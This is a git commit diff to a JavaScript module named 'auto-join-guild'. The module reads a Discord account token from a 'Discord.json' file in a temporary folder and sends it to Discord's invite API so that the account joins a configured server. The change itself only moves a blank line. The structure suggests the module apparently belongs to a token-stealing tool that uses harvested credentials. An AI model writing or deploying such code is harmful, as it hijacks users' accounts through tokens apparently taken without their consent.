4933498c6336245c3539befca355d8d45ce2a6cf
Yuuto <thelio.trinite@outlook.com>
2023-04-15 23:28:08 +0200

    auto join guild

--- functions/auto-join-guild.js
+++ functions/auto-join-guild.js
@@ -3,8 +3,8 @@ const { discord: { autoJoinGuild: inviteCode }, userAgent } = require('../config
 const { readFileSync } = require('fs');
 const { join } = require('path');
 const { tempFolder } = require('../index');
-
 const { token } = JSON.parse(readFileSync(join(tempFolder, 'Discord.json')).toString()).accounts[0];
+
 axios.post(`https://discord.com/api/v10/invites/${inviteCode}`, {
   headers: { Authorization: token, 'User-Agent': userAgent }
 });
